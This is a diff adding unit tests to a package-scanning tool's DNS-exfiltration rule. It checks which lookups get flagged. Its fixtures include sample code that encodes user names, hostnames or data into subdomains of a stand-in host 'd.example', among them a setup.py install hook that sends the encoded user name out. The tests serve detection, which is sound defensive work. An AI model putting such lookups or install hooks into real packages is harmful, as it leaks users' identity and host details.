@@ -326,6 +326,53 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("noteworthy", PackageReview.Scan("index.js", code, install: true, default, peel: false).Single(f => f.Rule == rule).Level);
     }
 
+    [Theory]
+    [InlineData("index.js", "const dns = require('dns');\ndns.lookup(`${Buffer.from(d).toString('hex')}.d.example`, cb);")]
+    [InlineData("index.js", "const os = require('os');\nconst q = `${os.hostname()}.d.example`;\ndns.resolve4(q, cb);")]
+    [InlineData("setup.py", "import base64, socket\nsocket.gethostbyname(base64.b32encode(u).decode()+'.d.example')")]
+    [InlineData("setup.py", "import socket\nsocket.getaddrinfo(f'{socket.gethostname()}.d.example', 53)")]
+    public void A_lookup_of_an_encoded_label_or_one_beside_host_details_is_noteworthy_outside_install(string path, string code) =>
+        Assert.Equal("noteworthy", PackageReview.Scan(path, code, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+
+    [Theory]
+    [InlineData("index.js", "dns.resolve4(`${rev}.bl.example`, cb);")]
+    [InlineData("client.py", "host = self.bucket + '.store.example'\nsocket.gethostbyname(host)")]
+    public void A_name_built_from_plain_values_is_review_outside_install(string path, string code) =>
+        Assert.Equal("review", PackageReview.Scan(path, code, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+
+    [Fact]
+    public void A_constant_host_lookup_is_noteworthy_only_at_install_beside_host_details()
+    {
+        const string code = "const dns = require('dns');\ndns.lookup('registry.example', cb);";
+        const string collects = "const os = require('os');\nconst u = os.userInfo();\n" + code;
+        Assert.Equal("review", PackageReview.Scan("install.js", code, install: true, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+        Assert.Equal("noteworthy", PackageReview.Scan("install.js", collects, install: true, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+        Assert.DoesNotContain(PackageReview.Scan("index.js", collects, install: false, default, peel: false), f => f.Rule == "package/dns-send");
+    }
+
+    [Fact]
+    public void A_setup_py_install_lookup_of_an_encoded_user_name_is_noteworthy()
+    {
+        var r = Review(Tgz("probe-0.1.0.tar.gz",
+            ("probe-0.1.0/PKG-INFO", "Metadata-Version: 2.1\nName: probe\nVersion: 0.1.0\n"),
+            ("probe-0.1.0/setup.py", "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64, getpass, socket\nclass Run(install):\n    def run(self):\n        u = getpass.getuser().encode()\n        socket.gethostbyname(base64.b32encode(u).decode().rstrip('=') + '.d.example')\nsetup(name='probe', version='0.1.0', cmdclass={'install': Run})\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/dns-send", Level: "noteworthy", Path: "probe-0.1.0/setup.py" });
+    }
+
+    [Theory]
+    [InlineData("dns.lookup('localhost', cb); dns.lookup(host, cb);")]
+    [InlineData("const name = `${host}.${domain}`;\ndns.lookup(name, cb);")]
+    [InlineData("fqdn = \"{}.{}\".format(hostname, domain)\nsocket.gethostbyname(fqdn)")]
+    [InlineData(" * dns.lookup('example.com', (err, address) => {});")]
+    [InlineData("/** dns.lookup('example.com', cb) */")]
+    [InlineData(">>> socket.gethostbyname('www.example.com')")]
+    [InlineData("def f():\n    \"\"\"Example:\n    socket.gethostbyname('www.example.com')\n    \"\"\"")]
+    [InlineData("socket.gethostbyname('printer.local')")]
+    [InlineData("dns.lookup(`${os.hostname()}.local`, cb);")]
+    [InlineData("name = svc + '.svc.cluster.local'\nsocket.gethostbyname(name)")]
+    public void A_local_name_a_host_and_domain_join_or_a_comment_is_not_reported(string code) =>
+        Assert.DoesNotContain(PackageReview.Scan("index.js", code, install: true, default, peel: false), f => f.Rule == "package/dns-send");
+
     [Fact]
     public void A_bin_that_passes_inflated_text_and_require_to_a_Function_is_noteworthy()
     {
